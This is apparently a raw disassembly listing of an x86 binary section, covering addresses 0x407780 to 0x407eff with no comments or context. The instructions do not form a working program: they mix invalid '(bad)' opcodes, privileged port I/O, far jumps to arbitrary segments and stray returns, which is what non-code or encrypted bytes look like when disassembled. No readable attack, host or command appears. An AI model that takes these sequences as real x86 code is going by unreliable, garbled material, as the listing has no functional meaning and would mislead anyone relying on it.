  407780:	in     eax,dx
  407781:	cmc    
  407782:	pop    ds
  407783:	jge    0x4077ab
  407785:	xchg   ebx,eax
  407786:	jmp    0xa795:0xdf885569
  40778d:	adc    bh,BYTE PTR [ecx-0x7e]
  407790:	pop    ds
  407791:	pop    ss
  407792:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407793:	ret    0xc9df
  407796:	retf   
  407797:	sbb    al,0xb0
  407799:	in     eax,0x89
  40779b:	mov    eax,eax
  40779d:	mov    ?,WORD PTR ds:0x73a7c81f
  4077a3:	loopne 0x407734
  4077a5:	jmp    0x407814
  4077a7:	cwde   
  4077a8:	div    BYTE PTR [ebx-0x46]
  4077ab:	stos   DWORD PTR es:[edi],eax
  4077ac:	inc    ebp
  4077ad:	retf   0xea1c
  4077b0:	dec    ecx
  4077b1:	jg     0x40778f
  4077b3:	add    al,0xa3
  4077b5:	fisttp QWORD PTR gs:[edx]
  4077b8:	jnp    0x4077be
  4077ba:	fcom   st(3)
  4077bc:	jg     0x407758
  4077be:	sbb    DWORD PTR fs:[edx+0x56],esp
  4077c2:	mov    ds:0x5407217e,al
  4077c7:	jp     0x407823
  4077c9:	repnz sti 
  4077cb:	mov    bh,BYTE PTR [edx+eax*8]
  4077ce:	push   esi
  4077cf:	or     cl,BYTE PTR [ebx]
  4077d1:	adc    al,0xc7
  4077d3:	mov    eax,ds:0x8c31ce0f
  4077d8:	out    dx,eax
  4077d9:	enter  0x1de4,0x75
  4077dd:	and    dh,BYTE PTR [ebp-0x1a]
  4077e0:	dec    esi
  4077e1:	cmp    al,0x7e
  4077e3:	inc    ebp
  4077e4:	retf   0x81e
  4077e7:	sbb    eax,0xe0e6728a
  4077ec:	jg     0x4077d9
  4077ee:	xchg   ebp,eax
  4077ef:	or     ebx,DWORD PTR [edi-0x3497e2d5]
  4077f5:	push   esi
  4077f6:	dec    ebp
  4077f7:	outs   dx,BYTE PTR ds:[esi]
  4077f8:	sub    edx,ebx
  4077fa:	call   FWORD PTR [esi-0x43]
  4077fd:	rcr    edi,0xc0
  407800:	test   DWORD PTR [esi+0x4a4635a1],0x45bdff7e
  40780a:	adc    ch,bl
  40780c:	or     al,0x34
  40780e:	mov    eax,0x498404de
  407813:	jnp    0x40784c
  407815:	ins    DWORD PTR es:[edi],dx
  407816:	push   ecx
  407817:	pop    edi
  407818:	push   esp
  407819:	mov    edi,0x54662adc
  40781e:	imul   eax,DWORD PTR [edi+esi*2],0x6a5ac568
  407825:	jb     0x407858
  407827:	out    dx,eax
  407828:	or     eax,0xbea2098
  40782d:	dec    ebp
  40782e:	retf   
  40782f:	mov    ebx,0x8fd118e3
  407834:	(bad)  
  407836:	dec    esp
  407837:	mov    al,ds:0xddcc054f
  40783c:	cmc    
  40783d:	add    al,0xa4
  40783f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407840:	iret   
  407841:	mov    bl,0x3c
  407843:	push   ebx
  407844:	js     0x4078b6
  407846:	lods   eax,DWORD PTR ds:[esi]
  407847:	ss mov esi,0x312b775f
  40784d:	clc    
  40784e:	xchg   esp,eax
  40784f:	sti    
  407850:	and    al,BYTE PTR [ebp-0x42fd683b]
  407856:	dec    edx
  407857:	pusha  
  407858:	and    DWORD PTR [ebx+0x336bbb6a],edx
  40785e:	push   esi
  40785f:	push   0xc
  407861:	push   edx
  407862:	pop    ecx
  407863:	icebp  
  407864:	(bad)  
  407865:	jo     0x40785e
  407867:	inc    eax
  407868:	int3   
  407869:	sub    eax,0xe133c3f
  40786e:	inc    ebp
  40786f:	pop    ecx
  407870:	pop    eax
  407871:	jnp    0x4078dc
  407873:	dec    esp
  407874:	push   cs
  407875:	loop   0x407812
  407877:	jg     0x40784c
  407879:	loop   0x40780d
  40787b:	aad    0x7a
  40787d:	shl    DWORD PTR [ecx-0x66],0x1b
  407881:	ss cmc 
  407883:	fadd   DWORD PTR [esi-0x449985fa]
  407889:	(bad)  
  40788b:	stos   BYTE PTR es:[edi],al
  40788c:	loop   0x40789f
  40788e:	fdivr  QWORD PTR [edi+0xe37e2da]
  407894:	mov    fs,esp
  407896:	inc    esi
  407897:	jmp    0x407838
  407899:	sti    
  40789a:	mov    WORD PTR ds:0x8d4088e1,es
  4078a0:	jne    0x4078f2
  4078a2:	in     eax,dx
  4078a3:	or     DWORD PTR [edi+0x74],edx
  4078a6:	test   DWORD PTR [eax],esi
  4078a8:	add    esp,DWORD PTR [ecx+0x1fe4ff7]
  4078ae:	mov    ds:0x48927772,eax
  4078b3:	mov    ah,BYTE PTR [ebx+0xc218a29]
  4078b9:	cwde   
  4078ba:	fs call 0x33bba50f
  4078c0:	in     eax,dx
  4078c1:	rcl    BYTE PTR [ecx+esi*4-0x7b80ad80],cl
  4078c8:	sahf   
  4078c9:	pop    ebp
  4078ca:	add    al,BYTE PTR [ecx-0x7c]
  4078cd:	loop   0x40785c
  4078cf:	jmp    0xcb96:0x60125c67
  4078d6:	stc    
  4078d7:	clc    
  4078d8:	sub    BYTE PTR [ebx-0x5477d5ba],dl
  4078de:	call   0x257b:0x8c7faee1
  4078e5:	add    DWORD PTR [ebx-0x68],esi
  4078e8:	fdivp  st(7),st
  4078ea:	es mov bl,0xf
  4078ed:	xor    al,0xe9
  4078ef:	lahf   
  4078f0:	mov    bh,0xf8
  4078f2:	cmp    BYTE PTR [ebx+eax*2+0xce663ce],al
  4078f9:	(bad)  
  4078fa:	jl     0x4078b5
  4078fc:	sub    al,0xb1
  4078fe:	xlat   BYTE PTR ds:[ebx]
  4078ff:	mov    esi,DWORD PTR [eax]
  407901:	fwait
  407902:	mov    ebp,0xadb4a90e
  407907:	or     ebx,eax
  407909:	stos   BYTE PTR es:[edi],al
  40790a:	hlt    
  40790b:	(bad)  
  40790d:	(bad)  
  40790e:	fldenv [edx+0x29]
  407911:	xchg   ebx,eax
  407912:	addr16 jnp 0x407940
  407915:	mov    bp,0x1700
  407919:	mov    esp,ecx
  40791b:	out    0x73,al
  40791d:	lahf   
  40791e:	add    edi,ecx
  407920:	xor    BYTE PTR [eax-0x52c990a7],cl
  407926:	adc    ch,BYTE PTR [eax]
  407928:	inc    edi
  407929:	cmp    al,0xaa
  40792b:	lods   eax,DWORD PTR ds:[esi]
  40792c:	mov    eax,0xf8024a5f
  407931:	mov    ah,0xc
  407933:	dec    eax
  407934:	pushf  
  407935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407936:	test   ch,bh
  407938:	jne    0x407919
  40793a:	in     al,0x81
  40793c:	test   BYTE PTR [esp+ebp*2],al
  40793f:	fs aad 0x2
  407942:	(bad)  
  407944:	std    
  407945:	js     0x40796d
  407947:	imul   esp,DWORD PTR [ebp+0x17fe454a],0x42
  40794e:	push   ecx
  40794f:	cmp    dh,BYTE PTR [ebp+eax*4+0x2f]
  407953:	push   eax
  407954:	(bad)  
  407955:	sti    
  407956:	in     eax,0x7c
  407958:	in     al,0x80
  40795a:	sbb    DWORD PTR ds:0x3a478fa5,esi
  407960:	pop    ss
  407961:	and    ebp,DWORD PTR [esi-0x7f2cbc92]
  407967:	ins    BYTE PTR es:[edi],dx
  407968:	cwde   
  407969:	sar    BYTE PTR [ebp-0x66],0x5a
  40796d:	sbb    DWORD PTR [edx],edx
  40796f:	inc    ebx
  407970:	push   ebp
  407971:	pop    eax
  407972:	jb     0x4079c0
  407974:	dec    ebp
  407975:	daa    
  407976:	jecxz  0x407924
  407978:	lods   eax,DWORD PTR ds:[esi]
  407979:	jmp    FWORD PTR [ebp-0x1b]
  40797c:	repz cmp al,0xbf
  40797f:	repz aaa 
  407981:	cs (bad) 
  407983:	cmp    BYTE PTR [ecx-0x6d68a57e],dl
  407989:	dec    ebp
  40798a:	mov    edi,0xb7b2b981
  40798f:	int3   
  407990:	aam    0x15
  407992:	pop    eax
  407993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407994:	dec    edi
  407995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407996:	jmp    DWORD PTR [ebp-0x6a02be9]
  40799c:	push   0xd27bd113
  4079a1:	jl     0x407976
  4079a3:	sbb    esi,DWORD PTR [edx+edi*8-0x75]
  4079a7:	push   edi
  4079a8:	sub    dh,bl
  4079aa:	jmp    0x4079c2
  4079ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079ad:	fwait
  4079ae:	add    al,0x23
  4079b0:	mov    ah,0x54
  4079b2:	sub    BYTE PTR [edi-0x535f2d40],dh
  4079b8:	bound  edi,QWORD PTR [esi+eax*1]
  4079bb:	inc    edx
  4079bc:	mov    ch,0xfc
  4079be:	ins    DWORD PTR es:[edi],dx
  4079bf:	fnstcw WORD PTR [ecx+0x7e0e9969]
  4079c5:	and    cl,0xc2
  4079c8:	mov    eax,0x3dd34bb3
  4079ce:	jne    0x407969
  4079d0:	out    dx,eax
  4079d1:	ds out dx,eax
  4079d3:	or     eax,DWORD PTR [esi+0x4d]
  4079d6:	mov    ?,WORD PTR [edi+ebx*8+0x35bb753b]
  4079dd:	fild   QWORD PTR [ecx+0x6f41e6c3]
  4079e3:	or     edi,ebp
  4079e5:	stos   DWORD PTR es:[edi],eax
  4079e6:	inc    esp
  4079e7:	jmp    0x407a32
  4079e9:	imul   edi,DWORD PTR [ebx],0x85cff628
  4079ef:	enter  0x8d81,0x89
  4079f3:	jns    0x4079bd
  4079f5:	imul   eax,DWORD PTR [ebp-0x5d],0x7e
  4079f9:	fwait
  4079fa:	test   al,0x6b
  4079fc:	xor    edi,DWORD PTR [ecx+0x5c]
  4079ff:	sub    ebx,ecx
  407a01:	mov    WORD PTR [edi],fs
  407a03:	pusha  
  407a04:	sahf   
  407a05:	outs   dx,DWORD PTR ds:[esi]
  407a06:	inc    ebx
  407a07:	jp     0x407a5e
  407a09:	dec    eax
  407a0a:	pushf  
  407a0b:	cs imul edi,esp,0x53c79b63
  407a12:	retf   
  407a13:	aas    
  407a14:	add    edx,DWORD PTR [eax+0x78]
  407a17:	stos   BYTE PTR es:[edi],al
  407a18:	xor    ch,BYTE PTR ds:0x1115194d
  407a1e:	test   BYTE PTR [ebp+0x3e],bh
  407a21:	xchg   DWORD PTR [edx],eax
  407a23:	mov    al,0xee
  407a25:	stc    
  407a26:	lahf   
  407a27:	aad    0x3a
  407a29:	dec    BYTE PTR [eax]
  407a2b:	popa   
  407a2c:	mov    ?,WORD PTR [esi-0x4f]
  407a2f:	fiadd  WORD PTR [eax+0x3d]
  407a32:	jnp    0x407a09
  407a34:	jmp    0xb16a5016
  407a39:	dec    ecx
  407a3a:	leave  
  407a3b:	and    BYTE PTR [ecx-0x771edc4e],0x40
  407a42:	mov    DWORD PTR [ebx+0x6f],ebx
  407a45:	cld    
  407a46:	inc    esp
  407a47:	mov    esi,0x9911af5e
  407a4c:	fdivr  QWORD PTR [ebx]
  407a4e:	xlat   BYTE PTR ds:[ebx]
  407a4f:	mov    eax,0xaeab2e5e
  407a54:	ins    BYTE PTR es:[edi],dx
  407a55:	lahf   
  407a56:	sbb    al,0x45
  407a58:	sar    BYTE PTR [edi+ebx*8+0x64],1
  407a5c:	std    
  407a5d:	in     al,dx
  407a5e:	push   esi
  407a5f:	jp     0x407a2e
  407a61:	or     eax,0x3fd7822b
  407a66:	icebp  
  407a67:	addr16 (bad) 
  407a69:	out    0xb8,al
  407a6b:	mov    ds:0xe135a61c,eax
  407a70:	scas   eax,DWORD PTR es:[edi]
  407a71:	das    
  407a72:	pop    esp
  407a73:	test   eax,0xb6e43df5
  407a78:	add    bl,BYTE PTR [esi+0x153e6c6a]
  407a7e:	adc    DWORD PTR [edi],eax
  407a80:	cld    
  407a81:	xor    eax,0x92aede6b
  407a86:	push   cs
  407a87:	sbb    ebx,0xffffffaa
  407a8a:	pop    ecx
  407a8b:	enter  0xac9b,0xb9
  407a8f:	out    dx,eax
  407a90:	out    0xdb,eax
  407a92:	pop    ebp
  407a93:	mov    ds,edi
  407a95:	push   0xfffffffe
  407a97:	and    ebx,DWORD PTR [ebp-0x6503df1b]
  407a9d:	bnd js 0x407a53
  407aa0:	stos   BYTE PTR es:[edi],al
  407aa1:	jbe    0x407ae7
  407aa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407aa4:	and    eax,0xc1ab946c
  407aa9:	push   es
  407aaa:	shl    WORD PTR [ecx+0x2cf58d09],cl
  407ab1:	and    eax,0x589ddf76
  407ab6:	push   ss
  407ab7:	xchg   esi,ebx
  407ab9:	push   es
  407aba:	fcomip st,st(1)
  407abc:	jb     0x407a77
  407abe:	aas    
  407abf:	stos   BYTE PTR es:[edi],al
  407ac0:	in     al,dx
  407ac1:	adc    BYTE PTR [esi],ah
  407ac3:	or     cl,BYTE PTR [ebp+0x43129938]
  407ac9:	pop    esp
  407aca:	and    dh,al
  407acc:	(bad)  
  407acd:	test   al,0xa6
  407acf:	outs   dx,BYTE PTR ds:[esi]
  407ad0:	imul   ebp,DWORD PTR [ebx+0x6f68cc8a],0xffffff88
  407ad7:	mov    ch,0x97
  407ad9:	cmp    DWORD PTR [edx],esp
  407adb:	pop    edx
  407adc:	pop    eax
  407add:	fs retf 
  407adf:	mov    ch,0xdf
  407ae1:	les    ebx,FWORD PTR [ebx+0x40e0c95e]
  407ae7:	in     al,0x75
  407ae9:	into   
  407aea:	(bad)  
  407aeb:	call   0x3329da07
  407af0:	push   es
  407af1:	sbb    BYTE PTR [edx],ch
  407af3:	cmp    eax,DWORD PTR [ebx-0x3ecd5e31]
  407af9:	or     ecx,DWORD PTR [esi+0x0]
  407afc:	and    al,0x44
  407afe:	enter  0xeab3,0x47
  407b02:	leave  
  407b03:	call   0xa92711a
  407b08:	pushf  
  407b09:	rcl    ah,1
  407b0b:	and    ah,dh
  407b0d:	aad    0x68
  407b0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b10:	inc    eax
  407b11:	add    DWORD PTR [ebp+0x50],ebx
  407b14:	xor    edx,ecx
  407b16:	mov    eax,ds:0xfc5f824c
  407b1b:	or     ebx,DWORD PTR [edi-0x7bf09528]
  407b21:	jl     0x407b1d
  407b23:	inc    ebx
  407b24:	jb     0x407aff
  407b26:	sti    
  407b27:	icebp  
  407b28:	sar    DWORD PTR [ebx],1
  407b2a:	lock adc BYTE PTR [edi],dh
  407b2d:	not    bh
  407b2f:	add    eax,0x95116809
  407b34:	push   es
  407b35:	sub    ebp,eax
  407b37:	das    
  407b38:	mul    BYTE PTR [ecx+edx*2+0x5f816ecc]
  407b3f:	int    0x15
  407b41:	popa   
  407b42:	lods   eax,DWORD PTR ds:[esi]
  407b43:	shl    ch,cl
  407b45:	sub    cl,BYTE PTR [ebx]
  407b47:	mov    ds:0xa27dd591,eax
  407b4c:	repz or ah,BYTE PTR [edi+0x7c]
  407b50:	(bad)  ds:0x2a44ea39
  407b56:	in     al,dx
  407b57:	sbb    DWORD PTR [edx-0x25f9902a],ebx
  407b5d:	mov    dh,0x2
  407b5f:	pop    ecx
  407b60:	add    dh,BYTE PTR [ebx]
  407b62:	sub    edx,DWORD PTR [ecx+eax*2-0xdee64f8]
  407b69:	mov    WORD PTR es:[ebx-0x77],ds
  407b6d:	add    bl,ch
  407b6f:	sbb    al,0x85
  407b71:	aam    0x4f
  407b73:	mov    WORD PTR [edx+0x5],?
  407b76:	and    BYTE PTR [esp+esi*8+0x30],dl
  407b7a:	mov    dh,0x8f
  407b7c:	sbb    al,0x93
  407b7e:	sub    esp,DWORD PTR [edx-0x222f28f7]
  407b84:	dec    BYTE PTR es:[ebp-0x4a]
  407b88:	aad    0x93
  407b8a:	mov    dl,0x28
  407b8c:	jns    0x407b8f
  407b8e:	pusha  
  407b8f:	add    BYTE PTR [edx+0x7e],bh
  407b92:	icebp  
  407b93:	mov    cl,0x3a
  407b95:	pop    edi
  407b96:	add    eax,0x534b0eef
  407b9b:	ret    0x9e18
  407b9e:	ja     0x407b9d
  407ba0:	sub    al,0xc8
  407ba2:	add    ah,BYTE PTR [eax-0x2acbb08a]
  407ba8:	pop    edx
  407ba9:	push   ss
  407baa:	sub    bh,bh
  407bac:	and    eax,0x62e5012f
  407bb1:	push   ss
  407bb2:	cwde   
  407bb3:	push   es
  407bb4:	test   al,0xef
  407bb6:	dec    esp
  407bb7:	call   0xded:0xc77a0b7b
  407bbe:	pop    es
  407bbf:	adc    DWORD PTR [esi],ebx
  407bc1:	out    0xc9,eax
  407bc3:	adc    bh,ah
  407bc5:	mov    eax,0xaa195faf
  407bca:	mov    eax,ds:0xdc97662e
  407bcf:	lea    ebx,[eax-0x4b]
  407bd2:	xlat   BYTE PTR ds:[ebx]
  407bd3:	sub    BYTE PTR [ebx+0x6773f0b3],dh
  407bd9:	pop    esi
  407bda:	xchg   esi,eax
  407bdb:	pop    edx
  407bdc:	int3   
  407bdd:	into   
  407bde:	add    al,0x41
  407be0:	pop    es
  407be1:	pop    esi
  407be2:	aas    
  407be3:	jp     0x407b89
  407be5:	push   edi
  407be6:	loopne 0x407b7f
  407be8:	out    0xca,eax
  407bea:	int3   
  407beb:	outs   dx,DWORD PTR ds:[esi]
  407bec:	scas   al,BYTE PTR es:[edi]
  407bed:	adc    DWORD PTR [edx-0x48],esp
  407bf0:	in     al,0x6a
  407bf2:	jo     0x407c44
  407bf4:	lods   eax,DWORD PTR ds:[esi]
  407bf5:	pop    ds
  407bf6:	jae    0x407c42
  407bf8:	bound  ebx,QWORD PTR [edx+0x618c36ca]
  407bfe:	add    al,0xda
  407c00:	mov    esp,0x3a00e73e
  407c05:	add    al,0xc0
  407c07:	xor    DWORD PTR [edi],edi
  407c09:	inc    ecx
  407c0a:	cld    
  407c0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c0c:	pop    ebx
  407c0d:	mov    ah,0x62
  407c0f:	jp     0x407bc9
  407c11:	mov    edi,0x8c00dccc
  407c16:	lods   al,BYTE PTR ds:[esi]
  407c17:	cmp    al,dl
  407c19:	ss pop esp
  407c1b:	popf   
  407c1c:	syscall 
  407c1e:	add    BYTE PTR [edi+0x1d308e5],al
  407c24:	hlt    
  407c25:	(bad)  
  407c26:	jge    0x407c86
  407c28:	es pusha 
  407c2a:	ss push ebx
  407c2c:	mov    dh,0x71
  407c2e:	je     0x407c1c
  407c30:	jo     0x407c4c
  407c32:	and    edi,DWORD PTR [edx]
  407c34:	inc    edx
  407c35:	and    ch,BYTE PTR [esp+edi*1+0x0]
  407c39:	(bad)  
  407c3a:	arpl   WORD PTR [ebx-0xabdc6ae],di
  407c40:	rcr    BYTE PTR [esp+eiz*2-0x60],1
  407c44:	pop    ss
  407c45:	xchg   ecx,eax
  407c46:	xor    eax,ebx
  407c48:	fisttp DWORD PTR [ebp+0x63]
  407c4b:	adc    al,0x1a
  407c4d:	xchg   ecx,eax
  407c4e:	shl    ch,1
  407c50:	xchg   ebx,eax
  407c51:	pop    ecx
  407c52:	jbe    0x407be0
  407c54:	push   eax
  407c55:	inc    DWORD PTR [eax-0xb]
  407c58:	repz fisubr WORD PTR [ebp+0x47]
  407c5c:	pop    edi
  407c5d:	mov    bh,0x39
  407c5f:	imul   eax,DWORD PTR [ebx+0x21a433ed],0xffffffc4
  407c66:	add    DWORD PTR [ecx-0x34447424],eax
  407c6c:	test   eax,0x6a961627
  407c71:	paddsw mm3,QWORD PTR [ecx+0xe047be9]
  407c78:	clc    
  407c79:	sbb    al,0x5
  407c7b:	xor    BYTE PTR ds:0x9286775b,ch
  407c81:	or     dh,BYTE PTR [edi+0x9]
  407c84:	xchg   ecx,eax
  407c85:	mov    dh,0x58
  407c87:	in     al,0x4b
  407c89:	adc    al,0xe9
  407c8b:	cld    
  407c8c:	lock or ebx,DWORD PTR [edx]
  407c8f:	in     eax,0x3b
  407c91:	stos   BYTE PTR es:[edi],al
  407c92:	cmp    eax,0x49232948
  407c97:	fst    QWORD PTR [ecx]
  407c99:	inc    esp
  407c9a:	loop   0x407c8e
  407c9c:	shl    BYTE PTR [edx-0x700ae1e6],0x25
  407ca3:	push   edx
  407ca4:	or     DWORD PTR [edi+0x4e],ebp
  407ca7:	push   ebp
  407ca8:	xchg   edi,eax
  407ca9:	sbb    ecx,DWORD PTR [ecx]
  407cab:	aas    
  407cac:	cwde   
  407cad:	pop    cx
  407caf:	sbb    al,0x1e
  407cb1:	rol    ecx,0xfe
  407cb4:	and    bl,ch
  407cb6:	in     al,0x94
  407cb8:	retf   0xe399
  407cbb:	icebp  
  407cbc:	push   ebp
  407cbd:	pop    ebx
  407cbe:	mov    dh,0x30
  407cc0:	int    0xfd
  407cc2:	test   al,0x83
  407cc4:	pop    esi
  407cc5:	int3   
  407cc6:	xchg   ebp,eax
  407cc7:	pop    edx
  407cc8:	retf   0x82ea
  407ccb:	jge    0x407ce9
  407ccd:	outs   dx,DWORD PTR ds:[esi]
  407cce:	mov    ah,0x91
  407cd0:	mov    eax,ds:0x2f9bf9c
  407cd5:	fucomip st,st(4)
  407cd7:	enter  0x247e,0xac
  407cdb:	add    ah,BYTE PTR [ebx+0x37]
  407cde:	popa   
  407cdf:	cmp    al,0x28
  407ce1:	retf   0xeab0
  407ce4:	mov    cl,0x83
  407ce6:	arpl   WORD PTR [edx-0x6d669657],sp
  407cec:	push   ecx
  407ced:	mov    bl,0xfc
  407cef:	icebp  
  407cf0:	cmp    ebx,edi
  407cf2:	sub    DWORD PTR [edx-0x22],0x1adfc588
  407cf9:	out    0x5e,eax
  407cfb:	into   
  407cfc:	xor    dl,BYTE PTR [edi+0x4b]
  407cff:	push   ss
  407d00:	popa   
  407d01:	xchg   ebx,eax
  407d02:	scas   eax,DWORD PTR es:[edi]
  407d03:	call   0x95f7:0x4d1a7dc5
  407d0a:	dec    esp
  407d0b:	dec    ebp
  407d0c:	loop   0x407d64
  407d0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d0f:	adc    eax,0xcfa601c2
  407d14:	push   0xffffffe9
  407d16:	pop    ebp
  407d17:	pusha  
  407d18:	(bad)  
  407d19:	loop   0x407d8d
  407d1b:	rol    BYTE PTR [esi],cl
  407d1d:	xchg   esi,eax
  407d1e:	mov    gs,WORD PTR [eax-0x5a]
  407d21:	sti    
  407d22:	(bad)  
  407d23:	in     eax,0xcf
  407d25:	dec    ebx
  407d26:	sbb    esp,DWORD PTR [eax+0x22ae94e3]
  407d2c:	or     DWORD PTR [eax-0xb97988],edi
  407d32:	xor    BYTE PTR [eax-0x3d],ah
  407d35:	int    0x6
  407d37:	xor    dl,BYTE PTR [edi+0x6afaa808]
  407d3d:	fistp  DWORD PTR [ebx-0x6341b0b4]
  407d43:	(bad)  
  407d44:	mov    cl,0x16
  407d46:	sahf   
  407d47:	xor    eax,0x569549e0
  407d4c:	and    ah,BYTE PTR [ebx]
  407d4e:	(bad)  
  407d4f:	out    dx,eax
  407d50:	pop    eax
  407d51:	fcom   QWORD PTR [ebx+0x55]
  407d54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d55:	or     BYTE PTR [ebx],0xd9
  407d58:	frstpm(287 only) 
  407d5a:	popa   
  407d5b:	xor    al,0x5e
  407d5d:	pop    esp
  407d5e:	shl    esi,0x47
  407d61:	pop    eax
  407d62:	jb     0x407d75
  407d64:	icebp  
  407d65:	ret    0xe31c
  407d68:	mov    DWORD PTR [ecx+0x22499cc6],esi
  407d6e:	mov    ebx,0x94e2f66
  407d73:	xchg   bh,ch
  407d75:	into   
  407d76:	loop   0x407db9
  407d78:	sub    DWORD PTR [ecx-0x16829911],ebx
  407d7e:	imul   eax,DWORD PTR [ebp+0x6ece1cc3],0x56
  407d85:	mov    ecx,0x93eff6a9
  407d8a:	mov    al,0xde
  407d8c:	inc    eax
  407d8d:	cdq    
  407d8e:	push   0x2a
  407d90:	outs   dx,DWORD PTR ds:[esi]
  407d91:	mov    ds,esi
  407d93:	dec    ebx
  407d94:	xchg   ebp,eax
  407d95:	jo     0x407dae
  407d97:	jmp    0x6d14dd65
  407d9c:	(bad)  
  407d9d:	hlt    
  407d9e:	inc    ebx
  407d9f:	shl    BYTE PTR [ebp-0x31],0xad
  407da3:	not    BYTE PTR [ebx-0x5d71a872]
  407da9:	xchg   ecx,eax
  407daa:	test   al,0x8e
  407dac:	push   ebp
  407dad:	push   ebp
  407dae:	test   esi,edx
  407db0:	push   ebx
  407db1:	adc    bh,BYTE PTR [edx-0x63]
  407db4:	pop    ebx
  407db5:	out    dx,eax
  407db6:	stos   BYTE PTR es:[edi],al
  407db7:	push   ss
  407db8:	cmp    BYTE PTR [ebx-0x2dff98a5],0x5f
  407dbf:	cdq    
  407dc0:	sbb    eax,0xd223f1b3
  407dc5:	cwde   
  407dc6:	jb     0x407db9
  407dc8:	push   eax
  407dc9:	call   0x4ad8:0x8eb0f963
  407dd0:	adc    DWORD PTR cs:[ebp+0xe],ecx
  407dd4:	mov    cs,WORD PTR [ebx-0x68411c81]
  407dda:	cmc    
  407ddb:	pop    ds
  407ddc:	mov    edx,0xa17f823d
  407de1:	dec    ecx
  407de2:	iret   
  407de3:	and    edx,DWORD PTR [edi+0xf]
  407de6:	xor    BYTE PTR [ebp-0x1a],dl
  407de9:	int3   
  407dea:	push   edx
  407deb:	mov    dh,0x9e
  407ded:	fcomp  DWORD PTR [ebx]
  407def:	xchg   esp,eax
  407df0:	stc    
  407df1:	add    dl,bh
  407df3:	popa   
  407df4:	(bad)  
  407df5:	mov    cl,0x2a
  407df7:	int    0x15
  407df9:	sbb    al,0x2c
  407dfb:	fcmovbe st,st(0)
  407dfd:	xchg   edi,eax
  407dfe:	(bad)  
  407dff:	push   0xe7de2bfa
  407e04:	mov    dl,0x49
  407e06:	outs   dx,BYTE PTR ds:[esi]
  407e07:	fadd   DWORD PTR [ecx]
  407e09:	add    DWORD PTR [esi-0x73],ecx
  407e0c:	fs push edi
  407e0e:	repnz fnstcw WORD PTR [edx]
  407e11:	aas    
  407e12:	adc    bl,bh
  407e14:	bound  edx,QWORD PTR [edi-0x66]
  407e17:	push   esp
  407e18:	jge    0x407e52
  407e1a:	dec    ebp
  407e1b:	xchg   edi,eax
  407e1c:	xor    BYTE PTR [ecx-0x4d],bh
  407e1f:	mov    ds:0x81a9918d,al
  407e24:	loope  0x407e9e
  407e26:	mov    al,0xa7
  407e28:	adc    BYTE PTR [ecx*8+0x16b6da90],cl
  407e2f:	arpl   WORD PTR [edx-0x65],sp
  407e32:	push   ss
  407e33:	jge    0x407e98
  407e35:	mov    al,0x63
  407e37:	push   0xffffffc6
  407e39:	repz popa 
  407e3b:	scas   eax,DWORD PTR es:[edi]
  407e3c:	inc    edi
  407e3d:	in     eax,0xf5
  407e3f:	stos   BYTE PTR es:[di],al
  407e41:	pushf  
  407e42:	jb     0x407e59
  407e44:	js     0x407e14
  407e46:	lock xor eax,0x392f7688
  407e4c:	xor    ebx,esi
  407e4e:	dec    esp
  407e4f:	call   0x322cf674
  407e54:	jecxz  0x407df1
  407e56:	fwait
  407e57:	mov    ah,0x8c
  407e59:	enter  0x4a51,0xef
  407e5d:	ret    0xfcae
  407e60:	sub    edx,eax
  407e62:	(bad)  
  407e63:	daa    
  407e64:	cld    
  407e65:	and    esi,DWORD PTR [edi]
  407e67:	test   DWORD PTR [ebp-0x72],edx
  407e6a:	pop    eax
  407e6b:	adc    bl,BYTE PTR [edi-0x56ded28a]
  407e71:	pop    esp
  407e72:	sbb    eax,0x18f32006
  407e77:	icebp  
  407e78:	and    bl,ah
  407e7a:	jbe    0x407e19
  407e7c:	inc    eax
  407e7d:	shl    edi,0x2c
  407e80:	mov    bh,bl
  407e82:	and    ah,bh
  407e84:	sub    al,0x6d
  407e86:	out    dx,eax
  407e87:	bound  edx,QWORD PTR [edx+esi*1+0x609abbe6]
  407e8e:	shl    ebp,cl
  407e90:	rep ins BYTE PTR es:[edi],dx
  407e92:	in     al,dx
  407e93:	(bad)  
  407e94:	pop    edx
  407e95:	push   edx
  407e96:	mov    cl,BYTE PTR [esi+0x173c6351]
  407e9c:	mov    eax,ds:0xba861de9
  407ea1:	cli    
  407ea2:	xchg   edi,eax
  407ea3:	fsqrt  
  407ea5:	hlt    
  407ea6:	(bad)  
  407ea7:	out    0x94,al
  407ea9:	(bad)  
  407eaa:	cmp    eax,0x3cb93940
  407eaf:	add    BYTE PTR [edx-0x75],bh
  407eb2:	outs   dx,BYTE PTR ds:[esi]
  407eb3:	outs   dx,BYTE PTR ds:[esi]
  407eb4:	push   ebx
  407eb5:	imul   edi,ecx,0xd4c8ecc2
  407ebb:	adc    edi,DWORD PTR [edi]
  407ebd:	std    
  407ebe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ebf:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ec1:	std    
  407ec2:	xchg   ecx,eax
  407ec3:	inc    esp
  407ec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ec5:	(bad)  
  407ec6:	push   edx
  407ec7:	push   ds
  407ec8:	push   cs
  407ec9:	(bad)  
  407eca:	dec    DWORD PTR [ebx-0x7f]
  407ecd:	test   DWORD PTR [esi-0x4862dc8f],esp
  407ed3:	js     0x407ee8
  407ed5:	repnz aas 
  407ed7:	dec    esp
  407ed8:	iret   
  407ed9:	popa   
  407eda:	out    dx,al
  407edb:	mov    edi,0xeecbc4bb
  407ee0:	scas   eax,DWORD PTR es:[edi]
  407ee1:	fcom   QWORD PTR [esi+0x1c03035a]
  407ee7:	mov    ch,0x22
  407ee9:	aad    0xc0
  407eeb:	mov    bh,0x2c
  407eed:	dec    esi
  407eee:	popf   
  407eef:	jb     0x407e88
  407ef1:	jmp    0xbb95:0xd1c4bc1d
  407ef8:	adc    DWORD PTR [edx],0x975b0977
  407efe:	cld    
  407eff:	jne    0x407f17
